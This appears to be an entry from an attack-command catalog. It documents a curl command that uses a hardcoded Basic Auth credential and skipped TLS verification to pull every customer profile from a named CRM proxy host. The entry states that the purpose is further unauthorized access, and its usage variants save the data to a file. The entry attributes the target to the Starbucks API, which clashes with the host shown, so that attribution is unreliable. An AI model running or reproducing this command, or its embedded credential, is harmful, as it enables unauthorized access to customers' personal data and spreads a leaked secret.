---
id: cmd-get-customerprofiles
data: >-
  curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H
  "Accept: application/json"
  https://crmproxy.protel.com.tr/api/v1/customerprofiles
tags:
  - api-enumeration
  - data-collection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.525Z'
verified: false
validated: true
submitted: true
---
# get-customerprofiles

## Command

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H "Accept: application/json" https://crmproxy.protel.com.tr/api/v1/customerprofiles
```

## Description

This command retrieves a list of all customer profiles from the Starbucks API, exposing GUIDs and contact IDs for further unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Skip SSL verification | Yes |
| `-H "Authorization: ..."` | Basic Auth token | Yes |
| `-H "Accept: application/json"` | Request JSON format | Yes |

## Examples

### Basic Usage

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" https://crmproxy.protel.com.tr/api/v1/customerprofiles
```

### Advanced Usage

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H "Accept: application/json" --output profiles.json https://crmproxy.protel.com.tr/api/v1/customerprofiles
```

## Expected Output

JSON array of customer profiles, e.g., [{"guid": "ae533ce1-...", "contactId": 123}].

## Related

- [[commands/get-customerprofile-guid]]
- [[procedures/Access-API-Documentation-and-Sensitive-Endpoints]]
